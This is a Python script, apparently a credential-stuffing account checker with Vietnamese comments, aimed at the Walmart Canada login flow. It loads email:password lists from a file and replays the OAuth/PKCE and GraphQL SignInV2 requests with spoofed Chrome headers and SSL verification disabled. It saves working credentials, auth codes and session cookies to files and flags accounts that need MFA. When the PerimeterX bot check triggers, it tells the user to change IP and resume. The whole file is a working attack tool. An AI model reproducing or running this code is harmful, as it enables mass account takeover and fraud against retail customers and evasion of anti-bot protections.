import re
import aiohttp
import asyncio
import secrets
import hashlib
import base64
import json

async def generate_pkce_pair():
    code_verifier = secrets.token_urlsafe(64)
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).decode().rstrip("=")
    return code_verifier, code_challenge

def log_result(status, email, password, details="", cookies=""):
    """Ghi kết quả đăng nhập vào tệp log."""
    with open("login_results.txt", "a", encoding="utf-8") as f:
        f.write(f"{status} | {email}:{password} | {details} | Cookies: {cookies}\n")

def log_success_account(email, password, auth_code, cookies):
    """Ghi tài khoản đăng nhập thành công vào tệp login_success.txt."""
    with open("login_success.txt", "a", encoding="utf-8") as f:
        f.write(f"{email}:{password} | Auth Code: {auth_code} | Cookies: {cookies}\n")


async def login_account(session, email, password):
    print(f"\n{'='*20}\n[*] Đang thử đăng nhập với tài khoản: {email}\n{'='*20}")    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6,zh-CN;q=0.5,zh;q=0.4',
        'cache-control': 'max-age=0',
        'downlink': '10',
        'dpr': '1.25',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    response = await session.get('https://www.walmart.ca/en', headers=headers, ssl=False)
    text = await response.text()

    # === Giữ nguyên đoạn bạn muốn ===
    tenant = re.search(r'tenantId["\']?\s*[:=]\s*["\'](.*?)["\']', text)
    tenant_id = tenant.group(1) if tenant else None

    client = re.search(r'clientId["\']?\s*[:=]\s*["\'](.*?)["\']', text)
    client_id = client.group(1) if client else None

    if tenant_id:
        print("tenantId:", tenant_id)
    else:
        print("Không tìm thấy tenantId")

    if client_id:
        print("clientId:", client_id)
    else:
        print("Không tìm thấy clientId")
    # ================================


    code_verifier, code_challenge = await generate_pkce_pair()
    print("code_challenge:", code_challenge)

    # request login
    params = {
        'client_id': client_id,
        'redirect_uri': 'https://www.walmart.ca/account/verifyToken',
        'scope': 'openid email offline_access',
        'tenant_id': tenant_id,
        'state': '/',
        'code_challenge': code_challenge,
        'code_challenge_method': 'S256',
        'response_type': 'code',
    }

    login_page_response = await session.get('https://identity.walmart.com/en/account/login', params=params, headers=headers, ssl=False)
    login_url = str(login_page_response.url)
    print("\nStatus:", login_page_response.status)
    print("URL:", login_url)
    # print("Preview:", (await login_page_response.text())[:1000])

    # === Yêu cầu GraphQL: GetLoginOptions ===
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-CA',
        'content-type': 'application/json',
        'device_profile_ref_id': 'f_k4iqe4tk7xlrcymoz89n04ry71l7vuwmgz',
        'downlink': '10',
        'dpr': '1.25',
        'origin': 'https://identity.walmart.com',
        'priority': 'u=1, i',
        'referer': login_url,
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'tenant-id': tenant_id,
        'traceparent': '00-186d0b5a8dff895be13699cab1055eb4-4333fbc7c3c7e384-00',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'wm_mp': 'true',
        'wm_page_url': login_url,
        'wm_qos.correlation_id': 'eN5DujSJyBCMyLWrnLvE1ZtMgeymm6O9Fa4A',
        'x-apollo-operation-name': 'GetLoginOptions',
        'x-enable-server-timing': '1',
        'x-latency-trace': '1',
        'x-o-bu': 'WALMART-CA',
        'x-o-ccm': 'server',
        'x-o-correlation-id': 'eN5DujSJyBCMyLWrnLvE1ZtMgeymm6O9Fa4A',
        'x-o-gql-query': 'query GetLoginOptions',
        'x-o-mart': 'B2C',
        'x-o-platform': 'rweb',
        'x-o-platform-version': 'intlc-1.155.0-90a196368af3bf4e5f0ba627510a774163536f06-9090401',
        'x-o-segment': 'oaoh',
    }

    json_data = {
        'query': 'query GetLoginOptions($input:UserOptionsInput!){getLoginOptions(input:$input){loginOptions{...LoginOptionsFragment}phoneCollectionRequired authCode errors{...LoginOptionsErrorFragment}}}fragment LoginOptionsFragment on LoginOptions{loginId loginIdType emailId phoneNumber{number countryCode isoCountryCode}canUsePassword canUsePhoneOTP canUseEmailOTP loginPhoneLastFour maskedPhoneNumberDetails{loginPhoneLastFour countryCode isoCountryCode}loginMaskedEmailId signInPreference loginPreference lastLoginPreference hasRemainingFactors isPhoneConnected otherAccountsWithPhone loginMaskedEmailId hasPasskeyOnProfile accountDomain}fragment LoginOptionsErrorFragment on IdentityLoginOptionsError{code message version}',
        'variables': {
            'input': {
                'loginId': email,
                'loginIdType': 'EMAIL',
                'ssoOptions': {
                    'wasConsentCaptured': True,
                    'callbackUrl': 'https://www.walmart.ca/account/verifyToken',
                    'clientId': client_id,
                    'scope': 'openid email offline_access',
                    'state': '/en',
                    'challenge': code_challenge,
                },
            },
        },
    }

    get_options_response = await session.post('https://identity.walmart.com/orchestra/graphql', headers=headers, json=json_data, ssl=False)
    # print("GetLoginOptions Response:", await get_options_response.json())

    # === Yêu cầu GraphQL: SignInV2 (Đăng nhập thực tế) ===
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-CA',
        'content-type': 'application/json',
        'device_profile_ref_id': '7vonzorl-zykhp5vcvqlsuzgbhufqbs1b-1i',
        'downlink': '10',
        'dpr': '1.25',
        'origin': 'https://identity.walmart.com',
        'priority': 'u=1, i',
        'referer': login_url.replace('/login', '/account/signin/withotpchoice'), # Cập nhật referer cho bước này
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'tenant-id': tenant_id,
        'traceparent': '00-186d0b64a44e775b6818b83073ce2d7a-35a34797e510ace8-00',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'wm_mp': 'true',
        'wm_page_url': login_url.replace('/login', '/account/signin/withotpchoice'),
        'wm_qos.correlation_id': 'M0zK8m8xw_LnwHfwpXALhpj_E1tTdSYL5Sx6',
        'x-apollo-operation-name': 'SignInV2',
        'x-enable-server-timing': '1',
        'x-latency-trace': '1',
        'x-o-bu': 'WALMART-CA',
        'x-o-ccm': 'server',
        'x-o-correlation-id': 'M0zK8m8xw_LnwHfwpXALhpj_E1tTdSYL5Sx6',
        'x-o-gql-query': 'mutation SignInV2',
        'x-o-mart': 'B2C',
        'x-o-platform': 'rweb',
        'x-o-platform-version': 'intlc-1.155.0-90a196368af3bf4e5f0ba627510a774163536f06-9090401',
        'x-o-segment': 'oaoh',
    }

    json_data = {
        'query': 'mutation SignInV2( $input:SignInV2Input! $includeLoginOptions:Boolean = false $includePhoneInfo:Boolean = false ){signInV2(input:$input){auth{loginId authCode clientConsentRequired}authCode{authCode cid}errors{...SignInErrorFragment}loginOptions @include(if:$includeLoginOptions){...LoginOptionsFragment}multiFactorInfo{nextFactor hasRemainingFactors phoneLastFour receiptId loginMaskedEmailId hasPasskeyOnProfile ignoreFactor maskedPhoneNumberDetails{loginPhoneLastFour countryCode isoCountryCode}}otpConsentInfo{showEmailOtpConsent showPhoneOtpConsent}phoneInfo @include(if:$includePhoneInfo){...SignInPhoneInfoFragment}}}fragment SignInErrorFragment on IdentitySignInError{code message version}fragment LoginOptionsFragment on LoginOptions{loginId loginIdType emailId phoneNumber{number countryCode isoCountryCode}canUsePassword canUsePhoneOTP canUseEmailOTP loginPhoneLastFour maskedPhoneNumberDetails{loginPhoneLastFour countryCode isoCountryCode}loginMaskedEmailId signInPreference loginPreference lastLoginPreference hasRemainingFactors isPhoneConnected otherAccountsWithPhone loginMaskedEmailId hasPasskeyOnProfile accountDomain}fragment SignInPhoneInfoFragment on PhoneInfo{phoneLastFour shouldCollectPhone isEmailSessionTrusted loginId isPhoneSessionTrusted isFirstSession isEmailValidated}',
        'variables': {
            'input': {
                'loginId': email,
                'password': password,
                'rememberMe': True,
                'ssoOptions': {
                    'wasConsentCaptured': True,
                    'callbackUrl': 'https://www.walmart.ca/account/verifyToken',
                    'clientId': client_id,
                    'scope': 'openid email offline_access',
                    'state': '/en',
                    'challenge': code_challenge,
                },
            },
            'includePhoneInfo': True,
        },
    }

    signin_response = await session.post('https://identity.walmart.com/orchestra/graphql', headers=headers, json=json_data, ssl=False)

    # --- Kiểm tra kết quả đăng nhập ---
    print("\n--- Kết quả đăng nhập ---")
    if signin_response.status == 200:
        signin_data = await signin_response.json() 
        # print("SignInV2 Response:", signin_data) 
        if signin_data.get("data", {}).get("signInV2", {}).get("authCode", {}).get("authCode"):
            auth_code = signin_data["data"]["signInV2"]["authCode"]["authCode"]
            print("✅ Đăng nhập thành công (Nhận được Auth Code)!")
            print(f"   Auth Code: {auth_code[:15]}...") # In một phần auth code
            

            cookies_list = []
            for cookie in session.cookie_jar:
                cookies_list.append({
                    "name": cookie.key,
                    "value": cookie.value,
                    "domain": cookie.get('domain', ''),
                    "path": cookie.get('path', '/')
                })
            cookie_string = json.dumps(cookies_list)
            log_result("SUCCESS", email, password, f"Auth Code: {auth_code}", cookies=cookie_string)
            log_success_account(email, password, auth_code, cookie_string)
        elif signin_data.get("data", {}).get("signInV2", {}).get("errors"):
            errors = signin_data["data"]["signInV2"]["errors"]
            error_messages = []
            is_invalid_credentials = False
            for error in errors:
                msg = f"{error.get('message')} (Code: {error.get('code')})"
                if error.get('code') == 1003: # Mã lỗi cho sai mật khẩu
                    is_invalid_credentials = True
                error_messages.append(msg)
            
            if is_invalid_credentials:
                print("❌ Đăng nhập thất bại! Sai tài khoản hoặc mật khẩu.")
                log_result("INVALID_CREDENTIALS", email, password, ", ".join(error_messages))
            else:
                print("❌ Đăng nhập thất bại! Lỗi từ API.")
                print(f"   Lỗi: {msg}")
                log_result("FAILURE", email, password, ", ".join(error_messages))
        elif signin_data.get("data", {}).get("signInV2", {}).get("multiFactorInfo"):
            mfa_info = signin_data["data"]["signInV2"]["multiFactorInfo"]
            next_factor = mfa_info.get('nextFactor')
            print(f"🟡 Cần xác thực thêm (MFA). Yếu tố tiếp theo: {next_factor}")
            log_result("MFA_REQUIRED", email, password, f"Next Factor: {next_factor}")

            # === Yêu cầu GET đến trang xác thực điện thoại (tùy chọn) ===
            print("\n--- Thực hiện yêu cầu đến trang xác thực điện thoại ---")
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6,zh-CN;q=0.5,zh;q=0.4',
                'downlink': '10',
                'dpr': '1.25',
                'priority': 'u=0, i',
                'referer': login_url.replace('/login', '/account/signin/withotpchoice'),
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            }
            params['tp'] = 'GIC' # Thêm tham số 'tp'

            phone_verif_response = await session.get(
                'https://identity.walmart.com/en/account/phoneverification',
                params=params,
                headers=headers,
                ssl=False
            )
            print(f"Status: {phone_verif_response.status}")
            print(f"URL: {phone_verif_response.url}")
            # Bạn cần xử lý phản hồi này để gửi mã OTP
        else:
            unknown_response_detail = "Phản hồi không xác định từ server."
            print(f"❌ Đăng nhập thất bại! {unknown_response_detail}")
            log_result("FAILURE", email, password, unknown_response_detail)
        return "SUCCESS" # Hoặc các trạng thái lỗi khác trong trường hợp 200
    elif signin_response.status == 412:
        # Trường hợp bị hệ thống chống bot (PerimeterX) chặn
        error_detail = "Bị phát hiện là BOT (CAPTCHA/Xác minh)."
        print(f"❌ Đăng nhập thất bại! {error_detail}")
        log_result("BOT_DETECTED", email, password, f"Lỗi HTTP 412 - {error_detail}")
        return "BOT_DETECTED"
    else:
        # Các lỗi HTTP khác
        error_text = await signin_response.text()
        error_detail = f"Lỗi HTTP: {signin_response.status}. Phản hồi: {error_text[:200]}"
        print(f"❌ Đăng nhập thất bại! {error_detail}")
        log_result("HTTP_ERROR", email, password, f"Lỗi HTTP {signin_response.status}")
        return "HTTP_ERROR"

async def main():
    """
    Hàm chính để đọc file tài khoản và thực hiện đăng nhập cho từng tài khoản.
    """
    # Hỏi người dùng có muốn kích hoạt tính năng dừng khi gặp captcha không
    stop_on_captcha_choice = input("Bạn có muốn Active Stop If Have Capcha? (y/n): ").lower()
    stop_on_captcha = stop_on_captcha_choice == 'y'

    account_file = "accounts.txt"
    try:
        with open(account_file, 'r', encoding='utf-8') as f:
            accounts = f.readlines()
    except FileNotFoundError:
        print(f"Lỗi: Không tìm thấy tệp '{account_file}'.")
        # Tạo tệp mẫu
        with open(account_file, 'w', encoding='utf-8') as f:
            f.write("email1@example.com:password123\n")
            f.write("email2@example.com|password456\n")
        print(f"Đã tạo một tệp mẫu '{account_file}'. Vui lòng thêm tài khoản của bạn vào đó và chạy lại.")
        return

    async with aiohttp.ClientSession() as session:
        for line in accounts:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            # Tách bằng dấu : hoặc |
            parts = re.split(r'[:|]', line, maxsplit=1)
            if len(parts) == 2:
                email, password = parts
                status = await login_account(session, email.strip(), password.strip())

                # Kiểm tra nếu gặp lỗi bot và người dùng đã chọn dừng lại
                if status == "BOT_DETECTED" and stop_on_captcha:
                    print("\n" + "="*50)
                    print("⚠️  PHÁT HIỆN CAPTCHA - CHƯƠNG TRÌNH ĐÃ TẠM DỪNG ⚠️")
                    print("👉 Vui lòng thay đổi địa chỉ IP của bạn trước khi tiếp tục.")
                    print("="*50)
                    continue_choice = input("Bạn có muốn tiếp tục với các tài khoản còn lại không? (y/n): ").lower()
                    if continue_choice != 'y':
                        print("Đã dừng chương trình theo yêu cầu của người dùng.")
                        break # Thoát khỏi vòng lặp for

                session.cookie_jar.clear()
            else:
                print(f"Dòng không hợp lệ, bỏ qua: '{line}'")

asyncio.run(main())
